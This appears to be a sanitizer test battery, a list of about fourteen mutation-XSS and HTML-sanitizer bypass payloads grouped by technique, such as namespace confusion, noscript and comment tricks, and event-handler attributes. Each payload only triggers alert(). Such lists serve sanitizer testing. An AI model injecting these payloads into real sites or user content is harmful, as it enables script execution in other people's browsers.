# mXSS / sanitizer battery

1. Namespace confusion:
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>

2. Template/noscript:
<template><script>alert(2)</script></template>
<noscript><p title="</noscript><img src=x onerror=alert(3)>">

3. ForeignObject:
<svg><foreignObject><iframe srcdoc="&lt;script&gt;alert(4)&lt;/script&gt;"></iframe></foreignObject></svg>

4. Comment tricks:
<!--><img src=x onerror=alert(5)>-->
<![CDATA[<img src=x onerror=alert(6)>]]>

5. Dangerous attrs survivors:
<img src=x srcset="javascript:alert(7) 1x">
<a href="#" formaction="javascript:alert(8)">x</a>
<video><source onerror="alert(9)"></video>
<input autofocus onfocus=alert(10)>
<style>@import 'https://example.com/x.css';</style>
<xss id=x tabindex=1 onactivate=alert(11)></xss>

6. Math variants:
<math><annotation-xml encoding="text/html"><img src=x onerror=alert(12)></annotation-xml></math>

7. Integration point:
<svg></p><style><a id="</style><img src=1 onerror=alert(13)>">

8. details/summary + microdata:
<details open ontoggle=alert(14)>t</details>
